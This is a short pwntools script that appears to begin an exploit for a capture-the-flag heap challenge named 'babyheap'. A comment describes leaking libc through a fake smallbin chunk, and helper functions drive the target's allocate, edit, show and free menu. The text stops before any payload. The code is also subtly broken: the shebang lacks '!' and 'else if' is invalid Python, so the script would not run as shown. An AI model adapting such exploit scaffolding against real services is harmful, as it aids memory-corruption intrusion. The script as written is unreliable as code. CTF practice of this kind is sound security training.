#/usr/bin/env python
from pwn import *
import sys
'''
this demo shows when you can't leak libc's address using fastbin,
you should make a fake samllbin to leak it.
'''
debug = 0
context.log_level = "DEBUG"

if len(sys.argv) == 1:
	p = process('./babyheap')
else if len(sys.argv) == 2:
	p = remote('', 0)
else:
	p = process('./babyheap')
	debug = 1

def alloc(index, content):
	p.sendlineafter("Choice:", str(1))
	p.sendlineafter("Index:", str(index))
	p.sendlineafter("Content:", content)

def edit(index, content):
	p.sendlineafter("Choice:", str(2))
	p.sendlineafter("Index:", str(index))
	p.sendlineafter("Content:", content)

def show(index):
	p.sendlineafter("Choice:", str(3))
	p.sendlineafter("Index:", str(index))


def free(index):
	p.sendlineafter("Choice:", str(4))
	p.sendlineafter("Index:", str(index))

p.recvuntil(".....\n")